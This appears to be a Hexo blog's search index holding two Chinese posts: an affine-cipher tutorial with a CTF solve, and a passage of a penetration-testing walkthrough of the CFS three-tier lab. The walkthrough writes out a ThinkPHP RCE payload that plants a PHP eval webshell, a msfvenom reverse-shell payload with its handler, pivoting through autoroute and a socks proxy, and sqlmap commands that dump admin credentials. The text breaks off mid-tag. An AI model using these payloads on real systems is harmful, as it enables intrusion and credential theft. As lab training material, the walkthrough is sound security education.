<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>仿射密码</title>
      <link href="/2023/08/31/%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/"/>
      <url>/2023/08/31/%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="定义及原理"><a href="#定义及原理" class="headerlink" title="定义及原理"></a>定义及原理</h2><p>仿射密码是移位密码的一个推广，其加密过程不仅包含移位操做，而且使用了乘法运算，与移位密码相同，仿射密码的明文空间M和密文空间C均为$Z_{26}$，因此，在使用使用仿射密码体制对英文消息进行加密之前，需要在26个英文字母与$Z_{26}$的元素之间建立一一对应的关系，其实也就相当于一种单表替换。</p><p>字母表的每个字母相应的值使用一个简单的数学函数对应一个数值，再把对应数值转换成字母。</p><p>eg:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">A BC DE FG HI J K  L  M  NO  P  Q  RS  T  U  VW  X  Y  Z<span class="token number">0</span> <span class="token number">1</span><span class="token number">2</span> <span class="token number">3</span><span class="token number">4</span> <span class="token number">5</span><span class="token number">6</span> <span class="token number">7</span><span class="token number">8</span> <span class="token number">9</span><span class="token number">10</span> <span class="token number">11</span> <span class="token number">12</span> <span class="token number">13</span><span class="token number">14</span> <span class="token number">15</span> <span class="token number">16</span> <span class="token number">17</span><span class="token number">18</span> <span class="token number">19</span> <span class="token number">20</span> <span class="token number">21</span><span class="token number">22</span> <span class="token number">23</span> <span class="token number">24</span> <span class="token number">25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="仿射密码体制"><a href="#仿射密码体制" class="headerlink" title="仿射密码体制"></a>仿射密码体制</h2><p>令 $M &#x3D; C &#x3D; Z_{26}$ ， 密钥空间 K &#x3D; { (k1,k2)∈ Z26 X Z26 ：gcd(k1,26) &#x3D; 1}。对任意的密钥key &#x3D; (k1,k2) ∈ K，x∈ M，y∈C，定义 ：</p><p>$E(x)&#x3D; (k_1 *x+k_2) \quad mod \quad26$</p><p>$D(x) &#x3D;  k_1^{-1}(y-k_2)\quad mod \quad26$</p><p>其中，$k_1^{-1}$表示在$Z_{26}$中的乘法逆；$gcd(k_1,26) &#x3D; 1$表示$k_1$与26互素。</p><h2 id="python代码实现"><a href="#python代码实现" class="headerlink" title="python代码实现"></a>python代码实现</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    ciphertext <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> plaintext<span class="token punctuation">:</span>        <span class="token keyword">if</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> char<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                encrypted_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                encrypted_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            encrypted_char <span class="token operator">=</span> char        ciphertext <span class="token operator">+=</span> encrypted_char    <span class="token keyword">return</span> ciphertext<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    plaintext <span class="token operator">=</span> <span class="token string">""</span>    mod_inverse_a <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            mod_inverse_a <span class="token operator">=</span> i            <span class="token keyword">break</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>        <span class="token keyword">if</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> char<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                decrypted_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mod_inverse_a <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                decrypted_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mod_inverse_a <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span> <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            decrypted_char <span class="token operator">=</span> char        plaintext <span class="token operator">+=</span> decrypted_char    <span class="token keyword">return</span> plaintext<span class="token comment"># 输入明文、加密参数a和b</span>plaintext <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入明文: "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密参数的可能取值：3,5,7,9,11,15,17,19,21,23,25"</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入加密参数a: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入加密参数b: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 加密</span>encrypted_text <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的密文: "</span> <span class="token operator">+</span> encrypted_text<span class="token punctuation">)</span><span class="token comment"># 解密</span>decrypted_text <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>encrypted_text<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密后的明文: "</span> <span class="token operator">+</span> decrypted_text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h2><h3 id="题目代码："><a href="#题目代码：" class="headerlink" title="题目代码："></a>题目代码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> syskey <span class="token operator">=</span> <span class="token string">'****CENSORED***************'</span> flag <span class="token operator">=</span> <span class="token string">'TWCTF&#123;*******CENSORED********&#125;'</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                              <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Key Length Error"</span><span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>encrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> c <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>        <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span>n<span class="token punctuation">:</span><span class="token number">2</span><span class="token operator">*</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">*</span> c <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">251</span>      encrypted <span class="token operator">+=</span> <span class="token string">'%02x'</span> <span class="token operator">%</span> c    <span class="token keyword">print</span> <span class="token punctuation">(</span>encrypted<span class="token punctuation">)</span><span class="token comment"># "805eed80cbbccb94c36413275780ec94a857dfec8da8ca94a8c313a8ccf9"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><p>首先判断加密的类型</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">*</span> c <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">251</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由此可得这应该是一个模251的仿射密码，为什么会模251？，他这里用的表不仅仅是26个英文字母了，用的的ASCII码表0~255，选一个接近255的质数比较安全</p><p>但是现在我们不知道两个密钥 a,b，所以首先我们要求出a,b,然后再利用仿射密码解密来求出flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2flag <span class="token operator">=</span> <span class="token string">'TWCTF&#123;*******CENSORED********&#125;'</span> data <span class="token operator">=</span> <span class="token string">"805eed80cbbccb94c36413275780ec94a857dfec8da8ca94a8c313a8ccf9"</span>encrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  plaindelta <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token comment">#提取部分已知明文</span>cipherdalte <span class="token operator">=</span> encrypted<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> encrypted<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token comment">#提取已知密文</span><span class="token comment">#原来的加密公式</span><span class="token comment">#y1 = (a * x1 + b) (mod 26)</span><span class="token comment">#y2 = (a * x2 + b) (mod 26)</span><span class="token comment">#故有</span><span class="token comment">#y1 - y2 = a*(x1-x2)(mod 251)</span><span class="token comment">#想要求a</span><span class="token comment">#即为</span><span class="token comment">#plaindelta = x1-x2</span><span class="token comment">#cipherdalta = y1-y2</span><span class="token comment">#cipherdalte = a * plaindelta(mod 251)    ！！取模只是让最后的结果在0~251范围之间！！</span><span class="token comment">#计算公式中的a，引入初等数论里面的内容</span><span class="token comment">#ci = a * p % 251</span><span class="token comment">#ci / p = a % 251</span><span class="token comment">#在初等数论中 除相当于乘逆元</span><span class="token comment">#故 ci * invert（p，251）= a （% 251）</span><span class="token comment">#所以%251只是一个对于整体结果的一个限制，在公式推到的时候可以忽略存在</span>a <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>plaindelta<span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">)</span> <span class="token operator">*</span> cipherdalte <span class="token operator">%</span> <span class="token number">251</span>   <span class="token comment">#数据全部放在0~251之间</span><span class="token comment">#通过a计算b</span>b <span class="token operator">=</span> <span class="token punctuation">(</span>encrypted<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> a <span class="token operator">*</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">251</span>     <span class="token comment">#数据全部放在0~251之间</span>a_inv <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> encrypted<span class="token punctuation">:</span>    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> a_inv <span class="token operator">%</span> <span class="token number">251</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment">#求得flag</span><span class="token comment">#TWCTF&#123;Faster_Than_Shinkansen!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 仿射密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CFS三层靶机</title>
      <link href="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/"/>
      <url>/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="环境下载与搭建"><a href="#环境下载与搭建" class="headerlink" title="环境下载与搭建"></a>环境下载与搭建</h2><p>三层靶机的OVA文件下载地址可以在teammssix的公众号“TeamsSix”回复“CFS”以获取。</p><p>下载解压好之后先配置三张网卡</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828204312904.png" alt="image-20230828204312904"></p><p>给攻击机配置网卡2</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828204450458.png" alt="image-20230828204450458"></p><p>给Target1配置2，3网卡</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828204756445.png" alt="image-20230828204756445"></p><p>给Target2配置网卡3，4</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828205102549.png" alt="image-20230828205102549"></p><p>给Target3配置网卡4</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828205150403.png" alt="image-20230828205150403"></p><p>这样环境就完全搭建好了</p><pre class="line-numbers language-none"><code class="language-none">攻击机kali：192.168.1.129Target1_Centos:192.168.1.128    192.168.22.128Target2_Ubuntu: 192.168.22.129   192.168.33.128Target3_win7:   192.168.33.33<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="攻击Target1"><a href="#攻击Target1" class="headerlink" title="攻击Target1"></a>攻击Target1</h2><p>先登录宝塔后台页面，把对应的IP地址改为自己靶机的IP地址登录即可</p><p>然后把自己靶机的IP添加进去</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828212352150.png" alt="image-20230828212352150">信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828211926980.png" alt="image-20230828211926980"></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>发现80端口开放，可以先进行访问</p><p>发现是thinkphp</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828212609853.png" alt="image-20230828212609853"> </p><pre class="line-numbers language-none"><code class="language-none">?s&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传参查看具体版本</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828212734494.png" alt="image-20230828212734494"></p><p>找利用方法写入一句话木马</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?s<span class="token operator">=</span>index/think<span class="token punctuation">\</span>app/invokefunction<span class="token operator">&amp;</span><span class="token assign-left variable">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>file_put_contents<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>shell.php<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'f14g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828213256493.png" alt="image-20230828213256493"></p><p>成功写入</p><p>蚁剑连接</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828213321048.png" alt="image-20230828213321048"></p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828213546754.png" alt="image-20230828213546754"></p><p>成功getshell</p><h3 id="获取主机权限"><a href="#获取主机权限" class="headerlink" title="获取主机权限"></a>获取主机权限</h3><p>利用msf生成木马</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.1.129 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">6666</span> <span class="token parameter variable">-f</span> elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828213853099.png" alt="image-20230828213853099"></p><p>在攻击机上开启web服务</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828214025476.png" alt="image-20230828214025476"></p><p>然后通过蚁剑终端下载生成的shell.elf</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828214157198.png" alt="image-20230828214157198"></p><p>在kali上设置监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.1.129<span class="token builtin class-name">set</span> lport <span class="token number">6666</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828214538591.png" alt="image-20230828214538591"></p><p>给shell.elf赋予执行权限，并执行</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828214649876.png" alt="image-20230828214649876"></p><p>然后就拿到meterpreter了</p><p>Target1就已经拿下</p><p>接下来进行内网渗透</p><h2 id="攻击Target2"><a href="#攻击Target2" class="headerlink" title="攻击Target2"></a>攻击Target2</h2><p>同样的先登录宝塔后台页面然后添加自己靶机的IP地址</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828214937715.png" alt="image-20230828214937715"></p><h3 id="路由信息探测"><a href="#路由信息探测" class="headerlink" title="路由信息探测"></a>路由信息探测</h3><p>我们使用msf自带的 探测网络接口的模块（get_local_subnets）查看路由的模块(autoroute -p)来进一步进行信息探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run get_local_subnets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828215200009.png" alt="image-20230828215200009"></p><p>发现还存在一个22网段</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现并没有路由被添加</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828215345690.png" alt="image-20230828215345690"></p><p><strong>路由：</strong>路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程，就相当于把我们要传输的数据先传输到该路由，再发往目标，我们可以通过设置路由的方式把我们的请求从centos网段发出，这样msf不就可以与22网段互通有无了吗），所以我们要来添加一个路由(autoroute -s)</p><p><strong>静态路由配置</strong></p><p>MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#通过meterpreter添加22网段的路由信息，这样kali与centos就可以互通了</span>run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.22.0/24run autoroute <span class="token parameter variable">-p</span><span class="token comment">#这一步也可以使用run post/multi/manage/autoroute自动添加路由</span>run post/multi/manage/autoroute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828215602723.png" alt="image-20230828215602723"></p><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/server/socks_proxy<span class="token builtin class-name">set</span> srvhost <span class="token number">192.168</span>.1.129<span class="token builtin class-name">set</span> version 4arun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828220146344.png" alt="image-20230828220146344"></p><p>配置proxychains的配置文件</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828220359476.png" alt="image-20230828220359476"></p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sT</span> <span class="token number">192.168</span>.22.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828233415982.png" alt="image-20230828233415982"></p><p>发现依旧开着80端口，直接访问</p><h3 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h3><p>访问的时候浏览器也要配置代理</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828220920703.png" alt="image-20230828220920703"></p><p>查看源代码</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828221049948.png" alt="image-20230828221049948"></p><p>应该是SQL注入</p><p>再扫一下根目录</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828221244078.png" alt="image-20230828221244078"></p><p>访问一下robots.txt</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828221323519.png" alt="image-20230828221323519"></p><p>访问&#x2F;index.php?r&#x3D;admini*出现后台页面</p><p>思路应该就是利用前面的SQL注入然后爆出账号密码，登陆后台getsell</p><p>直接用sqlmap跑</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.22.129/index.php?r=vul&amp;keyword=1"</span> <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--batch</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828221743179.png" alt="image-20230828221743179"></p><p>看一下bagecms有什么表</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.22.129/index.php?r=vul&amp;keyword=1"</span> <span class="token parameter variable">-D</span> bagecms <span class="token parameter variable">--tables</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828221943318.png" alt="image-20230828221943318"></p><p>看一下bage_admin下的内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.22.129/index.php?r=vul&amp;keyword=1"</span> <span class="token parameter variable">-D</span> bagecms <span class="token parameter variable">-T</span> bage_admin <span class="token parameter variable">--columns</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828222103362.png" alt="image-20230828222103362"></p><p>然后在dump 账号密码</p><pre class="line-numbers language-bash" 